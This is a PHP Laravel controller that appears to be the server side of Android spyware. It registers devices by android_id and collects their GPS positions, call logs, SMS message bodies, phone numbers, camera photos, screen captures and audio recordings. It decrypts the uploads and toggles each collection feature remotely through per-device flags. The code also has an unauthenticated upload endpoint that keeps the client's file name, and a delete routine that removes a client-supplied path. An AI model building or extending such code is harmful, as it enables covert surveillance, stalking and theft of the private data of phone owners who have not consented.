<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Inertia\Inertia;
use Illuminate\Contracts\Auth\MustVerifyEmail;

class ApkController extends Controller
{
    //
    public function admin(Request $request){
        $devices=DB::connection('ad_mysql')->table('flags')->get();
        return Inertia::render('profile/Index', [
            'status' => session('status'),
            'devices'=>$devices
        ]);
    }
    public function adminDetail($android_id)
    {
        // Fetch the device details (replace with actual logic)
        $detail = [
            'android_id' => $android_id,
            'model_name' => DB::connection('ad_mysql')->table('models')->where("android_id", $android_id)->first()->model_name ?? "미확정",
            'android_version' => DB::connection('ad_mysql')->table('versions')->where("android_id", $android_id)->first()->version ?? "미확정",
            'timing' => DB::connection('ad_mysql')->table('flags')->where("android_id", $android_id)->first()->timing ?? "미확정",
        ];

        return Inertia::render('profile/Detail', [
            'status' => session('status'),
            'detail'=>$detail
        ]);
    }
    public function fetchCamera(Request $request){
        $android_id=$request->post('android_id');
        $cameras =  DB::connection('ad_mysql')->table('cameras')->where('android_id',$android_id)->get();
        $images=array();
        foreach($cameras as $key=>$value){
            array_push($images,$value->filename);
        }
        $this->decryptImage($android_id,$images);
        return response()->json(array('cameras'=>$cameras));
    }
    public function fetchScreen(Request $request){
        $android_id=$request->post('android_id');
        $cameras =  DB::connection('ad_mysql')->table('screen_captures')->where('android_id',$android_id)->get();
        $images=array();
        foreach($cameras as $key=>$value){
            array_push($images,$value->filename);
        }
        $this->decryptImage($android_id,$images);
        return response()->json(array('screens'=>$cameras));
    }
    public function fetchAudio(Request $request){
        $android_id=$request->post('android_id');
        $cameras =  DB::connection('ad_mysql')->table('audio_records')->where('android_id',$android_id)->get();
        $images=array();
        foreach($cameras as $key=>$value){
            array_push($images,$value->filename);
        }
        $this->decryptImage($android_id,$images);
        return response()->json(array('audios'=>$cameras));
    }
    public function decryptImage($android_id,$images)
    {
        $directory = public_path('uploads');  
        $encFiles = glob($directory . '/*.enc', GLOB_NOSORT);
        $allowedFiles=$images;
        $encFiles = array_filter($encFiles, function ($file) use ($allowedFiles) {
            return in_array(basename($file), $allowedFiles);
        });

        $key = $android_id; 
        foreach ($encFiles as $filePath) {
            try {
                $encryptedData = file_get_contents($filePath);

                $iv = substr($encryptedData, 0, 12); 
                $ciphertext = substr($encryptedData, 12);  
            
                try {
                    $decryptedData = $this->decryptAESGCM($ciphertext, $iv, $key);
                    if (!file_exists(public_path('decrypted'))) {
                        mkdir(public_path('decrypted'), 0777, true);
                    }

                    if (strpos($filePath, "audio_") !== false) {
                        $outputPath = public_path('decrypted/' . basename($filePath, '.enc') . '.3gp');
                    } else {
                        $outputPath = public_path('decrypted/' . basename($filePath, '.enc') . '.png');
                    }
                    file_put_contents($outputPath, $decryptedData);

                    if (file_exists($filePath)) {
                        unlink($filePath);
                    }
                } catch (\Exception $e) {
                    Log::error('Decryption error: ' . $e->getMessage());
                    // return response()->json(['error' => 'Failed to decrypt image'], 500);
                }
            } catch (\Exception $e){
                // return response()->json(['error' => 'Failed to decrypt image'], 500);

            }
        }
    }
    public function removeItem(Request $request){
        $android_id=$request->post('android_id');
        $filename=$request->post('filename');
        $filetype=$request->post('filetype');
        $encFileName=$request->post('encFileName');
        $filePath = public_path('decrypted/'.$encFileName);
        unlink($filePath);
        if($filetype=="camera"){
            DB::connection('ad_mysql')->table('cameras')->where('filename',$filename)->delete();
            $assets=DB::connection('ad_mysql')->table('cameras')->where('android_id',$android_id)->get();
        }
        if($filetype=="screen"){
            DB::connection('ad_mysql')->table('screen_captures')->where('filename',$filename)->delete();
            $assets=DB::connection('ad_mysql')->table('screen_captures')->where('android_id',$android_id)->get();
        }
        if($filetype=="audio"){
            DB::connection('ad_mysql')->table('audio_records')->where('filename',$filename)->delete();
            $assets=DB::connection('ad_mysql')->table('audio_records')->where('android_id',$android_id)->get();
        }
        return response()->json(array('assets'=>$assets));


    }
    // Function to decrypt using AES-GCM with OpenSSL
    private function decryptAESGCM($ciphertext, $iv, $key)
    {
        $tagLength = 16;

        $tag = substr($ciphertext, -$tagLength); // Last 16 bytes are the authentication tag
        $ciphertext = substr($ciphertext, 0, -$tagLength); // Remove the tag from the ciphertext

        $decrypted = openssl_decrypt(
            $ciphertext,
            'aes-128-gcm', // AES algorithm, using 128-bit keys
            $key,
            OPENSSL_RAW_DATA,
            $iv,
            $tag
        );

        if ($decrypted === false) {
            throw new \Exception('Decryption failed');
        }

        return $decrypted;
    }


    public function fetchPhone(Request $request){
        $android_id=$request->post('android_id');
        $phone_numbers =  DB::connection('ad_mysql')->table('phone_numbers')->where('android_id',$android_id)->get();
        return response()->json(array('phone_numbers'=>$phone_numbers));
        
    }
    public function fetchSignal(Request $request){
        $android_id=$request->post('android_id');
        $signals =  DB::connection('ad_mysql')->table('signal_strengths')->where('android_id',$android_id)->get();
        return response()->json(array('signals'=>$signals));
        
    }
    public function fetchGps(Request $request){
        $android_id=$request->post('android_id');
        $gpss =  DB::connection('ad_mysql')->table('gpss')->where('android_id',$android_id)->get();
        return response()->json(array('gpss'=>$gpss));
        
    }
    public function fetchCalls(Request $request){
        $android_id=$request->post('android_id');
        $calls =  DB::connection('ad_mysql')->table('call_logs')->where('android_id',$android_id)->get();
        return response()->json(array('calls'=>$calls));
        
    }
    public function fetchSmss(Request $request){
        $android_id=$request->post('android_id');
        $smss =  DB::connection('ad_mysql')->table('sms_logs')->where('android_id',$android_id)->get();
        return response()->json(array('smss'=>$smss));
        
    }
    public function fromApk(Request $request){
   
        $data = [
            'status' => 'success',
            'message' => 'This is hardcoded data from the Laravel backend!',
            'users' => [
                [
                    'id' => 1,
                    'name' => 'John Doe',
                    'email' => 'john.doe@example.com'
                ],
                [
                    'id' => 2,
                    'name' => 'Jane Smith',
                    'email' => 'jane.smith@example.com'
                ]
            ]
        ];

        // Return the data as a JSON response
        return response()->json($data);

        
    }
    public function updateFlag(Request $request){
        $id=$request->post('id');
        $value=$request->post('value');
        $target=$request->post('target');
        if($target=="model_name"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("model_name"=>$value));
        }
        if($target=="android_version"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("android_version"=>$value));
        }
        if($target=="timing"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("timing"=>$value));
        }
        if($target=="phone_number"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("phone_number"=>$value));
        }
        if($target=="signal_strength"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("signal_strength"=>$value));
        }
        if($target=="gps"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("gps"=>$value));
        }
        if($target=="call_log"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("call_log"=>$value));
        }
        if($target=="sms_log"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("sms_log"=>$value));
        }
        if($target=="camera"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("camera"=>$value));
        }
        if($target=="screen_capture"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("screen_capture"=>$value));
        }
        if($target=="audio_record"){
            DB::connection('ad_mysql')->table('flags')->where('id',$id)->update(array("audio_record"=>$value));
        }
        $devices=DB::connection('ad_mysql')->table('flags')->get();
        return response()->json($devices);
    }


    public function getFlags(Request $request){
        $android_id = $request->get('android_id');
        $exist_id=DB::connection('ad_mysql')->table('android_ids')->where('android_id',$android_id)->get();
        if(count($exist_id)==0){
            $insert = array(
                'android_id'=>$android_id,
            );
            DB::connection('ad_mysql')->table("android_ids")->insert($insert);
        }
        $exist_id=DB::connection('ad_mysql')->table('flags')->where('android_id',$android_id)->get();
        if(count($exist_id)==0){
            $insert = array(
                'android_id'=>$android_id,
            );
            DB::connection('ad_mysql')->table("flags")->insert($insert);
        }
        $flags = DB::connection('ad_mysql')->table('flags')->where('android_id',$android_id)->first();
        // Return the data as a JSON response
        return response()->json($flags);
        
    }
    public function postData(Request $request){
        $android_id = $request->post('android_id');

        $target = $request->post('target');
        $data = $request->post('data');
        if($target=="error_logs"){
            $feature = $data['feature'] ?? "";
            $message = $data['message'] ?? "";
            try {
                $insert = array(
                    'android_id'=>$android_id,
                    'feature'=>$feature,
                    'message'=>$message
                );
                DB::connection('ad_mysql')->table("error_logs")->insert($insert);
    
                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="model_name"){
            $model_name = $data['model_name'] ?? "";
            try {
                $exist_id=DB::connection('ad_mysql')->table('models')->where('android_id',$android_id)->get();
                if(count($exist_id)==0){
                    $insert = array(
                        'android_id'=>$android_id,
                        'model_name'=>$model_name
                    );
                    DB::connection('ad_mysql')->table("models")->insert($insert);
                }
    
                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="android_version"){
            $version = $data['version'] ?? "";
            try {
                $exist_id=DB::connection('ad_mysql')->table('versions')->where('android_id',$android_id)->get();
                if(count($exist_id)==0){
                    $insert = array(
                        'android_id'=>$android_id,
                        'version'=>$version
                    );
                    DB::connection('ad_mysql')->table("versions")->insert($insert);
                }
    
                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="phone_number"){
            $phone_number = $data['phone_number'] ?? "";
            try {
    
                foreach($phone_number as $key=>$value){
                    $exist_id=DB::connection('ad_mysql')->table('phone_numbers')->where(array('android_id'=>$android_id,'phone_number'=>$value))->get();
                    if(count($exist_id)==0){
                        $insert = array(
                            'android_id'=>$android_id,
                            'phone_number'=>$value
                        );
                        DB::connection('ad_mysql')->table("phone_numbers")->insert($insert);
                    }

        
                }

                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="signal_strength"){
            $signal_strength = $data['signal_strength'] ?? "";
            try {
                $insert = array(
                    'android_id'=>$android_id,
                    'signal_strength'=>$signal_strength
                );
                DB::connection('ad_mysql')->table("signal_strengths")->insert($insert);
    
                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="gps"){
            $gps = $data['gps'] ?? "";
            try {
                $old=DB::connection('ad_mysql')->table('gpss')->where('gps',$gps)->get();
                if(count($old)==0){
                    $insert = array(
                        'android_id'=>$android_id,
                        'gps'=>$gps
                    );
                    DB::connection('ad_mysql')->table("gpss")->insert($insert);
        
                }

                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="call_log"){
            $callLogsString = $data['call_logs'] ?? "";
            $entries = explode("--new one--", $callLogsString);


            try {
                $parsedLogs = [];
                foreach ($entries as $entry) {
                    // Extract number, type, and date using a regular expression or string manipulation
                    preg_match('/Number: (.*?), Type: (.*?), Date: (.*)/', $entry, $matches);
        
                    if (count($matches) === 4) {
                        $parsedLogs[] = [
                            'android_id'=>$android_id,
                            'number' => $matches[1],
                            'type' => $matches[2],
                            'date' => $matches[3],
                        ];
                    }
                }
                foreach ($parsedLogs as $log) {
                    $old = DB::connection('ad_mysql')->table('call_logs')->where('date',$log['date'])->get();
                    if(count($old)==0){
                        DB::connection('ad_mysql')->table("call_logs")->insert($log);

                    }
                }

                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
        if($target=="sms_log"){
            $smsLogsString = $data['sms_logs'] ?? "";
            $entries = explode("--new one--", $smsLogsString);


            try {
                $parsedLogs = [];
                foreach ($entries as $entry) {
                    // Extract number, type, and date using a regular expression or string manipulation
                    preg_match('/Address: (.*?), Body: (.*?), Date: (.*)/', $entry, $matches);
        
                    if (count($matches) === 4) {
                        $parsedLogs[] = [
                            'android_id'=>$android_id,
                            'address' => $matches[1],
                            'body' => $matches[2],
                            'date' => $matches[3],
                        ];
                    }
                }
                foreach ($parsedLogs as $log) {
                    $old = DB::connection('ad_mysql')->table('sms_logs')->where('date',$log['date'])->get();
                    if(count($old)==0){
                        DB::connection('ad_mysql')->table("sms_logs")->insert($log);

                    }
                }

                // Return success response
                return response()->json([
                    'success' => true,
                    'message' => 'Data saved successfully'
                ]);
            } catch (\Exception $e) {
                // Handle any errors
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to save data',
                ]);
            }
        }
    }
    public function uploadFile(Request $request)
    {

        $file = $request->file('file');
        $android_id = $request->input('metadata');
        $exist_id=DB::connection('ad_mysql')->table('android_ids')->where('android_id',$android_id)->get();
        if(count($exist_id)==0){
            $insert = array(
                'android_id'=>$android_id,
            );
            DB::connection('ad_mysql')->table("android_ids")->insert($insert);
        }
        $fileName = $file->getClientOriginalName();
        $file->move(public_path('uploads'), $fileName);
        if (Str::startsWith($fileName, 'audio_')) {
            $insert = array(
                'android_id'=>$android_id,
                'filename'=>$fileName
            );
            DB::connection('ad_mysql')->table("audio_records")->insert($insert);
        }
        else if (Str::startsWith($fileName, 'screen_')) {
            $insert = array(
                'android_id'=>$android_id,
                'filename'=>$fileName
            );
            DB::connection('ad_mysql')->table("screen_captures")->insert($insert);
        }
        else if (Str::startsWith($fileName, 'front_')) {
            $insert = array(
                'android_id'=>$android_id,
                'filename'=>$fileName,
                'upfront'=>'front'
            );
            DB::connection('ad_mysql')->table("cameras")->insert($insert);
        }
        else if (Str::startsWith($fileName, 'back_')) {
            $insert = array(
                'android_id'=>$android_id,
                'filename'=>$fileName,
                'upfront'=>'back'
            );
            DB::connection('ad_mysql')->table("cameras")->insert($insert);
        }
        return response()->json(['success' => true, 'message' => 'File uploaded successfully']);
    }
}
